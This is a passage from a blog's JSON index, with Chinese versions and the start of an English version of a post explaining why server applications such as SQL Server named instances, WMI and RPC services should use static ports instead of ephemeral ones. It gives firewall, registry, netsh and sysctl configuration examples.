负载均衡器和代理服务器难以处理动态端口。它们需要静态目标来进行健康检查和路由。 4. 故障排除困难 当端口不断变化时，诊断连接问题变得更加困难。网络跟踪和日志每次都显示不同的端口。 5. 安全审计挑战 当端口动态变化时，安全团队无法审计哪些服务被暴露。合规要求通常要求固定、有文档记录的端口。 真实案例：Microsoft SQL Server 命名实例 Microsoft SQL Server 提供了一个完美的例子，说明为什么临时端口会造成问题，以及为什么静态端口是解决方案。 动态端口的问题 SQL Server 命名实例（例如 SERVER\\INSTANCE1）默认使用动态端口。当命名实例启动时，它会绑定到可用的临时端口。客户端通过查询 UDP 端口 1434 上的 SQL Server Browser 服务来发现此端口。 sequenceDiagram participant Client as 客户端 participant Browser as SQL Browser(UDP 1434) participant Instance as SQL 实例(动态端口) Note over Instance: 在随机端口 49823 上启动 Instance->>Browser: 在端口 49823上注册 Client->>Browser: INSTANCE1在哪个端口？ Browser->>Client: 端口 49823 Client->>Instance: 连接到 49823 Note over Instance,Client: ❌ 防火墙噩梦重新启动时端口会改变 为什么这会造成问题 防火墙配置：你必须在防火墙中打开 UDP 1434 和整个临时端口范围（49152-65535） 安全风险：打开数千个端口会增加攻击面 端口变更：每次实例重新启动时端口都会改变 网络复杂性：负载均衡器和代理服务器难以处理动态端口 故障排除：当端口不断变化时，诊断连接问题变得困难 解决方案：静态端口配置 配置命名实例使用静态端口，消除端口发现的需求。 逐步配置： 打开 SQL Server Configuration Manager 导航至 SQL Server Network Configuration &gt; Protocols for [INSTANCE] 右键点击 TCP/IP &gt; Properties &gt; IP Addresses 标签 滚动到 IPAll 区段 将 TCP Port 设置为静态值（例如 1435） 清除 TCP Dynamic Ports 字段（设置为空白） 重新启动 SQL Server 实例 🎯 SQL Server 端口分配策略系统化地分配静态端口： 默认实例：1433（标准） 命名实例 1：1434 命名实例 2：1435 命名实例 3：1436 在基础设施文档中记录端口分配。 连接字符串变更 &#x2F;&#x2F; 之前（动态端口 - 需要 SQL Browser） string connString &#x3D; &quot;Server&#x3D;MYSERVER\\\\INSTANCE1;Database&#x3D;MyDB;&quot;; &#x2F;&#x2F; 之后（静态端口 - 不需要 SQL Browser） string connString &#x3D; &quot;Server&#x3D;MYSERVER,1435;Database&#x3D;MyDB;&quot;; &#x2F;&#x2F; 或 string connString &#x3D; &quot;Server&#x3D;MYSERVER:1435;Database&#x3D;MyDB;&quot;; 防火墙配置 # 之前：必须打开 UDP 1434 + 整个临时端口范围 New-NetFirewallRule -DisplayName &quot;SQL Browser&quot; -Direction Inbound -Protocol UDP -LocalPort 1434 -Action Allow New-NetFirewallRule -DisplayName &quot;SQL Dynamic Ports&quot; -Direction Inbound -Protocol TCP -LocalPort 49152-65535 -Action Allow # 之后：只打开特定的静态端口 New-NetFirewallRule -DisplayName &quot;SQL INSTANCE1&quot; -Direction Inbound -Protocol TCP -LocalPort 1435 -Action Allow 优势比较 配置 动态端口 静态端口 防火墙规则 UDP 1434 + TCP 49152-65535 仅 TCP 1435 SQL Browser 必需 不需要 端口变更 每次重新启动 永不 安全性 ❌ 大攻击面 ✅ 最小暴露 故障排除 ❌ 复杂 ✅ 简单 负载均衡器 ❌ 困难 ✅ 容易 建议 ❌ 避免 ✅ 始终使用 ⚠️ 常见错误配置静态端口后，许多管理员忘记更新连接字符串。除非你在连接字符串中明确指定端口，否则客户端仍会尝试使用 SQL Browser（UDP 1434）： ❌ Server=MYSERVER\\INSTANCE1 (仍使用 SQL Browser) ✅ Server&#x3D;MYSERVER,1435 (直接使用静态端口) Windows RPC 和 WMI：配置静态端口 Windows Management Instrumentation（WMI）和其他 Windows RPC 服务也受到动态端口问题的困扰。默认情况下，它们使用整个临时端口范围，使防火墙配置变得具有挑战性。 WMI 动态端口问题 WMI 使用 DCOM（分布式 COM），它依赖于 RPC。默认情况下： 初始连接使用端口 135（RPC Endpoint Mapper） 实际的 WMI 通信使用 49152-65535 范围内的随机端口 防火墙必须允许整个范围才能让 WMI 运作 sequenceDiagram participant Client as 客户端 participant EPM as 端点映射器(端口 135) participant WMI as WMI 服务(动态端口) Client->>EPM: 请求 WMI 端点 EPM->>Client: 使用端口 52341 Client->>WMI: 连接到 52341 Note over Client,WMI: ❌ 需要在防火墙中打开 49152-65535 解决方案：限制 RPC 动态端口范围 Windows 允许将 RPC 动态端口限制在特定的较小范围内： # 将 RPC 动态端口范围设置为 50000-50099（100 个端口） netsh int ipv4 set dynamicport tcp start&#x3D;50000 num&#x3D;100 netsh int ipv4 set dynamicport udp start&#x3D;50000 num&#x3D;100 # 验证设置 netsh int ipv4 show dynamicport tcp netsh int ipv4 show dynamicport udp # 重新启动 WMI 服务以应用更改 Restart-Service Winmgmt -Force 配置 WMI 使用固定端口 为了更严格的控制，配置 WMI 使用特定的固定端口： # 将 WMI 设置为使用固定端口 24158 winmgmt &#x2F;standalonehost # 配置 DCOM 端口 $reg &#x3D; [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey(&#39;LocalMachine&#39;, $env:COMPUTERNAME) $regKey &#x3D; $reg.OpenSubKey(&quot;SOFTWARE\\Microsoft\\Rpc\\Internet&quot;, $true) $regKey.SetValue(&quot;Ports&quot;, &quot;50000-50099&quot;, [Microsoft.Win32.RegistryValueKind]::MultiString) $regKey.SetValue(&quot;PortsInternetAvailable&quot;, &quot;Y&quot;, [Microsoft.Win32.RegistryValueKind]::String) $regKey.SetValue(&quot;UseInternetPorts&quot;, &quot;Y&quot;, [Microsoft.Win32.RegistryValueKind]::String) # 重新启动 WMI Restart-Service Winmgmt -Force WMI 的防火墙配置 # 允许 RPC Endpoint Mapper New-NetFirewallRule -DisplayName &quot;RPC Endpoint Mapper&quot; -Direction Inbound -Protocol TCP -LocalPort 135 -Action Allow # 允许受限的 RPC 动态端口范围 New-NetFirewallRule -DisplayName &quot;RPC Dynamic Ports&quot; -Direction Inbound -Protocol TCP -LocalPort 50000-50099 -Action Allow # 允许 WMI-In New-NetFirewallRule -DisplayName &quot;WMI-In&quot; -Direction Inbound -Program &quot;%SystemRoot%\\System32\\svchost.exe&quot; -Service Winmgmt -Action Allow ⚠️ 生产环境考量限制 RPC 端口范围时： 首先在非生产环境中彻底测试 确保范围有足够的端口供你的工作负载使用 监控&quot;端口耗尽&quot;错误 为未来的管理员记录配置 考虑对其他基于 RPC 的服务的影响 RPC 服务的解决方案 除了 SQL Server 和 WMI 之外，以下是任何需要避免临时端口的 RPC 服务的一般解决方案。 1. 使用固定的众所周知端口 最简单且最可靠的解决方案：为你的 RPC 服务分配临时端口范围之外的固定端口号。 # gRPC 示例：固定端口 import grpc from concurrent import futures server &#x3D; grpc.server(futures.ThreadPoolExecutor(max_workers&#x3D;10)) server.add_insecure_port(&#39;[::]:50051&#39;) # 固定端口，非临时端口 server.start() # Kubernetes Service：固定端口 apiVersion: v1 kind: Service metadata: name: grpc-service spec: ports: - port: 50051 # 固定端口 targetPort: 50051 protocol: TCP selector: app: grpc-server 优势： 客户端始终知道要连接到哪里 防火墙规则简单明了 不需要端口发现机制 跨重新启动可靠运作 🎯 RPC 服务的端口选择在注册端口范围（1024-49151）中选择端口或与你的组织协调： gRPC：通常使用 50051 Thrift：通常使用 9090 自定义 RPC：从 10000-49151 中选择 避免：0-1023（需要 root）、49152+（临时端口范围） 2. 使用服务发现 现代微服务架构使用服务发现系统，完全抽象化端口号。 # Consul 服务注册 import consul c &#x3D; consul.Consul() c.agent.service.register( name&#x3D;&#39;my-rpc-service&#39;, service_id&#x3D;&#39;my-rpc-service-1&#39;, address&#x3D;&#39;10.0.1.5&#39;, port&#x3D;50051, tags&#x3D;[&#39;rpc&#39;, &#39;v1&#39;] ) # 客户端发现服务 services &#x3D; c.health.service(&#39;my-rpc-service&#39;, passing&#x3D;True) service_address &#x3D; services[1][0][&#39;Service&#39;][&#39;Address&#39;] service_port &#x3D; services[1][0][&#39;Service&#39;][&#39;Port&#39;] 服务发现选项： Consul：具有健康检查的全功能服务网格 etcd：用于服务注册的分布式键值存储 Kubernetes DNS：K8s 集群的内置服务发现 Eureka：Netflix 的服务注册表 ZooKeeper：分布式协调服务 3. 使用具有固定端点的负载均衡器 在 RPC 服务前放置负载均衡器。负载均衡器监听固定端口，而后端服务可以使用任何端口。 # AWS Application Load Balancer for gRPC listener: port: 50051 protocol: HTTP2 targets: - target: backend-1:54321 # 后端可以使用任何端口 - target: backend-2:54322 - target: backend-3:54323 4. 容器编排端口映射 在容器化环境中，将容器端口映射到固定的主机端口： # Docker Compose services: rpc-service: image: my-rpc-service ports: - &quot;50051:50051&quot; # 主机:容器 - 两者都固定 # Kubernetes apiVersion: v1 kind: Pod metadata: name: rpc-service spec: containers: - name: rpc image: my-rpc-service ports: - containerPort: 50051 name: grpc RPC 最佳实践摘要 graph TB A([\"RPC 服务设计\"]) --> B{需要外部访问？} B -->|是| C([\"使用固定端口1024-49151\"]) B -->|否| D{使用编排？} D -->|是| E([\"使用服务发现Consul/K8s DNS\"]) D -->|否| C C --> F([\"为固定端口配置防火墙\"]) E --> G([\"让编排器处理路由\"]) F --> H([\"✅ 客户端可靠连接\"]) G --> H style C fill:#e8f5e9,stroke:#388e3c,stroke-width:2px style E fill:#e8f5e9,stroke:#388e3c,stroke-width:2px style H fill:#e3f2fd,stroke:#1976d2,stroke-width:2px 旧版 RPC 系统 较旧的 RPC 系统由于依赖端口映射器和动态端口而呈现特殊挑战。 ⚠️ 旧版 RPC 系统较旧的 RPC 系统（Sun RPC、Microsoft RPC/DCOM）使用端口映射器和动态端口，造成安全和防火墙挑战： Sun RPC：在端口 111 上使用 portmapper，服务绑定到随机端口 Microsoft RPC：在端口 135 上使用端点映射器，动态端口范围 49152-65535 NFS：使用多个具有动态端口的服务 现代替代方案： 迁移到具有固定端口的 gRPC、Thrift 或 REST API 如果无法迁移，使用 VPN 或限制在内部网络 配置 Windows RPC 使用受限的端口范围（如上所示） 使用理解 RPC 协议的应用层网关 高流量服务器的高级调整 对于进行许多对外连接的服务器（作为客户端使用临时端口），可能需要额外的调整。 扩展临时端口范围 # Linux：扩展临时端口范围 sudo sysctl -w net.ipv4.ip_local_port_range&#x3D;&quot;10000 65535&quot; # 通过添加到 &#x2F;etc&#x2F;sysctl.conf 使其永久生效 echo &quot;net.ipv4.ip_local_port_range &#x3D; 10000 65535&quot; | sudo tee -a &#x2F;etc&#x2F;sysctl.conf ⚠️ 更改端口范围时的注意事项在扩展临时端口范围之前： 验证新范围中没有服务监听端口 更新防火墙规则以允许扩展的范围 在非生产环境中彻底测试 记录更改以供未来故障排除 优化 TIME_WAIT 持续时间 处于 TIME_WAIT 状态的连接会在一段时间内（通常为 60-120 秒）占用临时端口。在高流量系统上，这可能导致端口耗尽。 # Linux：减少 TIME_WAIT 持续时间（谨慎使用） sudo sysctl -w net.ipv4.tcp_fin_timeout&#x3D;30 # 启用 TIME_WAIT socket 重用 sudo sysctl -w net.ipv4.tcp_tw_reuse&#x3D;1 ⚠️ TIME_WAIT 调整风险减少 TIME_WAIT 持续时间可能会造成问题： 来自旧连接的延迟数据包可能会混淆新连接 只有在遇到端口耗尽时才减少 更改后监控连接错误 RFC 1323 建议至少 60 秒 结论：服务器应用程序的静态端口 虽然临时端口对客户端应用程序运作得很好，但需要可被发现的服务器应用程序应始终使用静态的众所周知端口。此原则特别适用于： RPC 服务（gRPC、Thrift、自定义 RPC） 数据库命名实例（SQL Server、Oracle） Windows 服务（WMI、DCOM） 任何需要防火墙规则的服务 负载均衡器后面的服务 通过配置静态端口，你可以获得： 简化的防火墙配置：只打开特定端口，而非整个范围 改善的安全性：具有文档记录、可审计端口的最小攻击面 更容易的故障排除：跨重新启动的一致端口 更好的监控：用于健康检查和指标的固定目标 可靠的连接性：客户端始终知道要连接到哪里 配置静态端口的额外努力在操作简单性、安全性和可靠性方面获得回报。 💭 最后的想法&quot;临时端口对客户端来说是完美的——临时的、自动的、不可见的。但对于服务器来说，可预测性胜过便利性。静态端口将混乱转变为秩序，使你的基础设施可管理、安全且可靠。&quot; 延伸阅读 RFC 6335 - Internet Assigned Numbers Authority (IANA) Procedures for Port Number Management Microsoft SQL Server Network Configuration Windows RPC Dynamic Port Configuration gRPC Best Practices","categories":[{"name":"Development","slug":"Development","permalink":"https://neo01.com/categories/Development/"}],"tags":[{"name":"Infrastructure","slug":"Infrastructure","permalink":"https://neo01.com/tags/Infrastructure/"},{"name":"Security","slug":"Security","permalink":"https://neo01.com/tags/Security/"},{"name":"Networking","slug":"Networking","permalink":"https://neo01.com/tags/Networking/"},{"name":"RPC","slug":"RPC","permalink":"https://neo01.com/tags/RPC/"},{"name":"SQL Server","slug":"SQL-Server","permalink":"https://neo01.com/tags/SQL-Server/"}],"lang":"zh-CN"},{"title":"理解臨時埠 Part 2：為什麼伺服器應用程式應避免使用動態埠","slug":"2025/08/Understanding_Ephemeral_Ports_Part2-zh-TW","date":"un00fin00","updated":"un22fin22","comments":true,"path":"/zh-TW/2025/08/Understanding_Ephemeral_Ports_Part2/","permalink":"https://neo01.com/zh-TW/2025/08/Understanding_Ephemeral_Ports_Part2/","excerpt":"探討為什麼 RPC 服務和 SQL Server 具名執行個體不應使用臨時埠，並學習如何設定靜態埠以建立可靠且安全的伺服器應用程式。","text":"在 Part 1 中，我們探討了臨時埠如何從客戶端角度運作——當應用程式發起對外連線時，作業系統會自動分配的臨時埠。這對客戶端來說運作得很完美，因為它們不需要被發現；它們確切知道要連接到哪個伺服器和埠。 但當伺服器應用程式在臨時埠範圍內使用動態埠時會發生什麼？這會產生一個根本問題：客戶端無法找到服務。如果你的資料庫伺服器今天在埠 54321 上啟動，明天在埠 49876 上啟動，客戶端如何知道要連接到哪裡？ 這就是伺服器應用程式動態埠分配的挑戰，在 RPC（遠端程序呼叫）系統和資料庫具名執行個體中特別常見。在本文中，我們將探討為什麼這種方法會造成問題，以及如何透過靜態埠設定來解決它們。 RPC 挑戰：當臨時埠不適用時 遠端程序呼叫（RPC）服務在臨時埠的世界中呈現出獨特的挑戰。與典型的客戶端-伺服器應用程式不同（客戶端使用臨時埠，伺服器監聽眾所周知的埠），傳統的 RPC 系統通常會動態分配埠給服務——這會產生發現問題。 為什麼 RPC 服務不應使用臨時埠 RPC 服務需要可被發現。當客戶端想要呼叫遠端程序時，它需要知道服務正在監聽哪個埠。如果服務使用每次重新啟動都會改變的臨時埠，客戶端就無法找到它。 傳統 RPC 問題： RPC 服務啟動並綁定到隨機臨時埠（例如 54321） 客戶端想要連接但不知道要使用哪個埠 客戶端必須查詢埠對應器/端點對應器服務來發現埠 這增加了複雜性、延遲和潛在的故障點 sequenceDiagram participant Client as 客戶端 participant PortMapper as 埠對應器(埠 111) participant RPC as RPC 服務(埠 ???) Note over RPC: 在隨機臨時埠 54321 上啟動 RPC->>PortMapper: 在埠 54321上註冊服務 Client->>PortMapper: 服務 X在哪個埠？ PortMapper->>Client: 埠 54321 Client->>RPC: 連接到 54321 Note over Client,RPC: ❌ 複雜、脆弱、防火牆不友善 伺服器應用程式使用動態埠的問題 1. 防火牆設定惡夢 你必須在防火牆中開放整個臨時埠範圍（可能超過 16,000 個埠），造成巨大的安全暴露。 2. 重新啟動時埠會改變 每次服務重新啟動時，它都會獲得不同的埠。連接字串、防火牆規則和監控工具必須動態適應。 3. 負載平衡器複雜性 負載平衡器和代理伺服器難以處理動態埠。它們需要靜態目標來進行健康檢查和路由。 4. 疑難排解困難 當埠不斷變化時，診斷連接問題變得更加困難。網路追蹤和日誌每次都顯示不同的埠。 5. 安全稽核挑戰 當埠動態變化時，安全團隊無法稽核哪些服務被暴露。合規要求通常要求固定、有文件記錄的埠。 真實案例：Microsoft SQL Server 具名執行個體 Microsoft SQL Server 提供了一個完美的例子，說明為什麼臨時埠會造成問題，以及為什麼靜態埠是解決方案。 動態埠的問題 SQL Server 具名執行個體（例如 SERVER\\INSTANCE1）預設使用動態埠。當具名執行個體啟動時，它會綁定到可用的臨時埠。客戶端透過查詢 UDP 埠 1434 上的 SQL Server Browser 服務來發現此埠。 sequenceDiagram participant Client as 客戶端 participant Browser as SQL Browser(UDP 1434) participant Instance as SQL 執行個體(動態埠) Note over Instance: 在隨機埠 49823 上啟動 Instance->>Browser: 在埠 49823上註冊 Client->>Browser: INSTANCE1在哪個埠？ Browser->>Client: 埠 49823 Client->>Instance: 連接到 49823 Note over Instance,Client: ❌ 防火牆惡夢重新啟動時埠會改變 為什麼這會造成問題 防火牆設定：你必須在防火牆中開放 UDP 1434 和整個臨時埠範圍（49152-65535） 安全風險：開放數千個埠會增加攻擊面 埠變更：每次執行個體重新啟動時埠都會改變 網路複雜性：負載平衡器和代理伺服器難以處理動態埠 疑難排解：當埠不斷變化時，診斷連接問題變得困難 解決方案：靜態埠設定 設定具名執行個體使用靜態埠，消除埠發現的需求。 逐步設定： 開啟 SQL Server Configuration Manager 導航至 SQL Server Network Configuration &gt; Protocols for [INSTANCE] 右鍵點擊 TCP/IP &gt; Properties &gt; IP Addresses 標籤 捲動到 IPAll 區段 將 TCP Port 設定為靜態值（例如 1435） 清除 TCP Dynamic Ports 欄位（設定為空白） 重新啟動 SQL Server 執行個體 🎯 SQL Server 埠分配策略系統化地分配靜態埠： 預設執行個體：1433（標準） 具名執行個體 1：1434 具名執行個體 2：1435 具名執行個體 3：1436 在基礎架構文件中記錄埠分配。 連接字串變更 &#x2F;&#x2F; 之前（動態埠 - 需要 SQL Browser） string connString &#x3D; &quot;Server&#x3D;MYSERVER\\\\INSTANCE1;Database&#x3D;MyDB;&quot;; &#x2F;&#x2F; 之後（靜態埠 - 不需要 SQL Browser） string connString &#x3D; &quot;Server&#x3D;MYSERVER,1435;Database&#x3D;MyDB;&quot;; &#x2F;&#x2F; 或 string connString &#x3D; &quot;Server&#x3D;MYSERVER:1435;Database&#x3D;MyDB;&quot;; 防火牆設定 # 之前：必須開放 UDP 1434 + 整個臨時埠範圍 New-NetFirewallRule -DisplayName &quot;SQL Browser&quot; -Direction Inbound -Protocol UDP -LocalPort 1434 -Action Allow New-NetFirewallRule -DisplayName &quot;SQL Dynamic Ports&quot; -Direction Inbound -Protocol TCP -LocalPort 49152-65535 -Action Allow # 之後：只開放特定的靜態埠 New-NetFirewallRule -DisplayName &quot;SQL INSTANCE1&quot; -Direction Inbound -Protocol TCP -LocalPort 1435 -Action Allow 優勢比較 設定 動態埠 靜態埠 防火牆規則 UDP 1434 + TCP 49152-65535 僅 TCP 1435 SQL Browser 必需 不需要 埠變更 每次重新啟動 永不 安全性 ❌ 大攻擊面 ✅ 最小暴露 疑難排解 ❌ 複雜 ✅ 簡單 負載平衡器 ❌ 困難 ✅ 容易 建議 ❌ 避免 ✅ 始終使用 ⚠️ 常見錯誤設定靜態埠後，許多管理員忘記更新連接字串。除非你在連接字串中明確指定埠，否則客戶端仍會嘗試使用 SQL Browser（UDP 1434）： ❌ Server=MYSERVER\\INSTANCE1 (仍使用 SQL Browser) ✅ Server&#x3D;MYSERVER,1435 (直接使用靜態埠) Windows RPC 和 WMI：設定靜態埠 Windows Management Instrumentation（WMI）和其他 Windows RPC 服務也受到動態埠問題的困擾。預設情況下，它們使用整個臨時埠範圍，使防火牆設定變得具有挑戰性。 WMI 動態埠問題 WMI 使用 DCOM（分散式 COM），它依賴於 RPC。預設情況下： 初始連接使用埠 135（RPC Endpoint Mapper） 實際的 WMI 通訊使用 49152-65535 範圍內的隨機埠 防火牆必須允許整個範圍才能讓 WMI 運作 sequenceDiagram participant Client as 客戶端 participant EPM as 端點對應器(埠 135) participant WMI as WMI 服務(動態埠) Client->>EPM: 請求 WMI 端點 EPM->>Client: 使用埠 52341 Client->>WMI: 連接到 52341 Note over Client,WMI: ❌ 需要在防火牆中開放 49152-65535 解決方案：限制 RPC 動態埠範圍 Windows 允許將 RPC 動態埠限制在特定的較小範圍內： # 將 RPC 動態埠範圍設定為 50000-50099（100 個埠） netsh int ipv4 set dynamicport tcp start&#x3D;50000 num&#x3D;100 netsh int ipv4 set dynamicport udp start&#x3D;50000 num&#x3D;100 # 驗證設定 netsh int ipv4 show dynamicport tcp netsh int ipv4 show dynamicport udp # 重新啟動 WMI 服務以套用變更 Restart-Service Winmgmt -Force 設定 WMI 使用固定埠 為了更嚴格的控制，設定 WMI 使用特定的固定埠： # 將 WMI 設定為使用固定埠 24158 winmgmt &#x2F;standalonehost # 設定 DCOM 埠 $reg &#x3D; [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey(&#39;LocalMachine&#39;, $env:COMPUTERNAME) $regKey &#x3D; $reg.OpenSubKey(&quot;SOFTWARE\\Microsoft\\Rpc\\Internet&quot;, $true) $regKey.SetValue(&quot;Ports&quot;, &quot;50000-50099&quot;, [Microsoft.Win32.RegistryValueKind]::MultiString) $regKey.SetValue(&quot;PortsInternetAvailable&quot;, &quot;Y&quot;, [Microsoft.Win32.RegistryValueKind]::String) $regKey.SetValue(&quot;UseInternetPorts&quot;, &quot;Y&quot;, [Microsoft.Win32.RegistryValueKind]::String) # 重新啟動 WMI Restart-Service Winmgmt -Force WMI 的防火牆設定 # 允許 RPC Endpoint Mapper New-NetFirewallRule -DisplayName &quot;RPC Endpoint Mapper&quot; -Direction Inbound -Protocol TCP -LocalPort 135 -Action Allow # 允許受限的 RPC 動態埠範圍 New-NetFirewallRule -DisplayName &quot;RPC Dynamic Ports&quot; -Direction Inbound -Protocol TCP -LocalPort 50000-50099 -Action Allow # 允許 WMI-In New-NetFirewallRule -DisplayName &quot;WMI-In&quot; -Direction Inbound -Program &quot;%SystemRoot%\\System32\\svchost.exe&quot; -Service Winmgmt -Action Allow ⚠️ 生產環境考量限制 RPC 埠範圍時： 首先在非生產環境中徹底測試 確保範圍有足夠的埠供你的工作負載使用 監控「埠耗盡」錯誤 為未來的管理員記錄設定 考慮對其他基於 RPC 的服務的影響 RPC 服務的解決方案 除了 SQL Server 和 WMI 之外，以下是任何需要避免臨時埠的 RPC 服務的一般解決方案。 1. 使用固定的眾所周知埠 最簡單且最可靠的解決方案：為你的 RPC 服務分配臨時埠範圍之外的固定埠號。 # gRPC 範例：固定埠 import grpc from concurrent import futures server &#x3D; grpc.server(futures.ThreadPoolExecutor(max_workers&#x3D;10)) server.add_insecure_port(&#39;[::]:50051&#39;) # 固定埠，非臨時埠 server.start() # Kubernetes Service：固定埠 apiVersion: v1 kind: Service metadata: name: grpc-service spec: ports: - port: 50051 # 固定埠 targetPort: 50051 protocol: TCP selector: app: grpc-server 優勢： 客戶端始終知道要連接到哪裡 防火牆規則簡單明瞭 不需要埠發現機制 跨重新啟動可靠運作 🎯 RPC 服務的埠選擇在註冊埠範圍（1024-49151）中選擇埠或與你的組織協調： gRPC：通常使用 50051 Thrift：通常使用 9090 自訂 RPC：從 10000-49151 中選擇 避免：0-1023（需要 root）、49152+（臨時埠範圍） 2. 使用服務發現 現代微服務架構使用服務發現系統，完全抽象化埠號。 # Consul 服務註冊 import consul c &#x3D; consul.Consul() c.agent.service.register( name&#x3D;&#39;my-rpc-service&#39;, service_id&#x3D;&#39;my-rpc-service-1&#39;, address&#x3D;&#39;10.0.1.5&#39;, port&#x3D;50051, tags&#x3D;[&#39;rpc&#39;, &#39;v1&#39;] ) # 客戶端發現服務 services &#x3D; c.health.service(&#39;my-rpc-service&#39;, passing&#x3D;True) service_address &#x3D; services[1][0][&#39;Service&#39;][&#39;Address&#39;] service_port &#x3D; services[1][0][&#39;Service&#39;][&#39;Port&#39;] 服務發現選項： Consul：具有健康檢查的全功能服務網格 etcd：用於服務註冊的分散式鍵值儲存 Kubernetes DNS：K8s 叢集的內建服務發現 Eureka：Netflix 的服務註冊表 ZooKeeper：分散式協調服務 3. 使用具有固定端點的負載平衡器 在 RPC 服務前放置負載平衡器。負載平衡器監聽固定埠，而後端服務可以使用任何埠。 # AWS Application Load Balancer for gRPC listener: port: 50051 protocol: HTTP2 targets: - target: backend-1:54321 # 後端可以使用任何埠 - target: backend-2:54322 - target: backend-3:54323 4. 容器編排埠對應 在容器化環境中，將容器埠對應到固定的主機埠： # Docker Compose services: rpc-service: image: my-rpc-service ports: - &quot;50051:50051&quot; # 主機:容器 - 兩者都固定 # Kubernetes apiVersion: v1 kind: Pod metadata: name: rpc-service spec: containers: - name: rpc image: my-rpc-service ports: - containerPort: 50051 name: grpc RPC 最佳實踐摘要 graph TB A([\"RPC 服務設計\"]) --> B{需要外部存取？} B -->|是| C([\"使用固定埠1024-49151\"]) B -->|否| D{使用編排？} D -->|是| E([\"使用服務發現Consul/K8s DNS\"]) D -->|否| C C --> F([\"為固定埠設定防火牆\"]) E --> G([\"讓編排器處理路由\"]) F --> H([\"✅ 客戶端可靠連接\"]) G --> H style C fill:#e8f5e9,stroke:#388e3c,stroke-width:2px style E fill:#e8f5e9,stroke:#388e3c,stroke-width:2px style H fill:#e3f2fd,stroke:#1976d2,stroke-width:2px 舊版 RPC 系統 較舊的 RPC 系統由於依賴埠對應器和動態埠而呈現特殊挑戰。 ⚠️ 舊版 RPC 系統較舊的 RPC 系統（Sun RPC、Microsoft RPC/DCOM）使用埠對應器和動態埠，造成安全和防火牆挑戰： Sun RPC：在埠 111 上使用 portmapper，服務綁定到隨機埠 Microsoft RPC：在埠 135 上使用端點對應器，動態埠範圍 49152-65535 NFS：使用多個具有動態埠的服務 現代替代方案： 遷移到具有固定埠的 gRPC、Thrift 或 REST API 如果無法遷移，使用 VPN 或限制在內部網路 設定 Windows RPC 使用受限的埠範圍（如上所示） 使用理解 RPC 協定的應用層閘道 高流量伺服器的進階調整 對於進行許多對外連接的伺服器（作為客戶端使用臨時埠），可能需要額外的調整。 擴展臨時埠範圍 # Linux：擴展臨時埠範圍 sudo sysctl -w net.ipv4.ip_local_port_range&#x3D;&quot;10000 65535&quot; # 透過新增到 &#x2F;etc&#x2F;sysctl.conf 使其永久生效 echo &quot;net.ipv4.ip_local_port_range &#x3D; 10000 65535&quot; | sudo tee -a &#x2F;etc&#x2F;sysctl.conf ⚠️ 變更埠範圍時的注意事項在擴展臨時埠範圍之前： 驗證新範圍中沒有服務監聽埠 更新防火牆規則以允許擴展的範圍 在非生產環境中徹底測試 記錄變更以供未來疑難排解 最佳化 TIME_WAIT 持續時間 處於 TIME_WAIT 狀態的連接會在一段時間內（通常為 60-120 秒）佔用臨時埠。在高流量系統上，這可能導致埠耗盡。 # Linux：減少 TIME_WAIT 持續時間（謹慎使用） sudo sysctl -w net.ipv4.tcp_fin_timeout&#x3D;30 # 啟用 TIME_WAIT socket 重用 sudo sysctl -w net.ipv4.tcp_tw_reuse&#x3D;1 ⚠️ TIME_WAIT 調整風險減少 TIME_WAIT 持續時間可能會造成問題： 來自舊連接的延遲封包可能會混淆新連接 只有在遇到埠耗盡時才減少 變更後監控連接錯誤 RFC 1323 建議至少 60 秒 結論：伺服器應用程式的靜態埠 雖然臨時埠對客戶端應用程式運作得很好，但需要可被發現的伺服器應用程式應始終使用靜態的眾所周知埠。此原則特別適用於： RPC 服務（gRPC、Thrift、自訂 RPC） 資料庫具名執行個體（SQL Server、Oracle） Windows 服務（WMI、DCOM） 任何需要防火牆規則的服務 負載平衡器後面的服務 透過設定靜態埠，你可以獲得： 簡化的防火牆設定：只開放特定埠，而非整個範圍 改善的安全性：具有文件記錄、可稽核埠的最小攻擊面 更容易的疑難排解：跨重新啟動的一致埠 更好的監控：用於健康檢查和指標的固定目標 可靠的連接性：客戶端始終知道要連接到哪裡 設定靜態埠的額外努力在操作簡單性、安全性和可靠性方面獲得回報。 💭 最後的想法「臨時埠對客戶端來說是完美的——臨時的、自動的、不可見的。但對於伺服器來說，可預測性勝過便利性。靜態埠將混亂轉變為秩序，使你的基礎架構可管理、安全且可靠。」 延伸閱讀 RFC 6335 - Internet Assigned Numbers Authority (IANA) Procedures for Port Number Management Microsoft SQL Server Network Configuration Windows RPC Dynamic Port Configuration gRPC Best Practices","categories":[{"name":"Development","slug":"Development","permalink":"https://neo01.com/categories/Development/"}],"tags":[{"name":"Infrastructure","slug":"Infrastructure","permalink":"https://neo01.com/tags/Infrastructure/"},{"name":"Security","slug":"Security","permalink":"https://neo01.com/tags/Security/"},{"name":"Networking","slug":"Networking","permalink":"https://neo01.com/tags/Networking/"},{"name":"RPC","slug":"RPC","permalink":"https://neo01.com/tags/RPC/"},{"name":"SQL Server","slug":"SQL-Server","permalink":"https://neo01.com/tags/SQL-Server/"}],"lang":"zh-TW"},{"title":"Understanding Ephemeral Ports Part 2: Why Server Applications Should Avoid Dynamic Ports","slug":"2025/08/Understanding_Ephemeral_Ports_Part2","date":"un00fin00","updated":"un33fin33","comments":true,"path":"2025/08/Understanding_Ephemeral_Ports_Part2/","permalink":"https://neo01.com/2025/08/Understanding_Ephemeral_Ports_Part2/","excerpt":"Discover why RPC services and SQL Server named instances should never use ephemeral ports, and learn how to configure static ports for reliable, secure server applications.","text":"In Part 1, we explored how ephemeral ports work from the client perspective - temporary ports that your operating system assigns automatically when applications initiate outbound connections. This works beautifully for clients because they don’t need to be discoverable; they know exactly which server and port to connect to. But what happens when server applications use dynamic ports in the ephemeral range? This creates a fundamental problem: clients can’t find the service. If your database server starts on port 54321 today and port 49876 tomorrow, how do clients know where to connect? This is the challenge of dynamic port assignment for server applications, particularly common in RPC (Remote Procedure Call) systems and database named instances. In this post, we’ll explore why this approach causes problems and how to solve them with static port configuration. The RPC Challenge: When Ephemeral Ports Don’t Work Remote Procedure Call (RPC) services present a unique challenge in the world of ephemeral ports. Unlike typical client-server applications where clients use ephemeral ports and servers listen on well-known ports, traditional RPC systems often dynamically assign ports to services - creating a discovery problem. Why RPC Services Shouldn’t Use Ephemeral Ports RPC services need to be discoverable. When a client wants to call a remote procedure, it needs to know which port the service is listening on. If the service uses an ephemeral port that changes with each restart, clients can’t find it. Traditional RPC Problem: RPC service starts and binds to a random ephemeral port 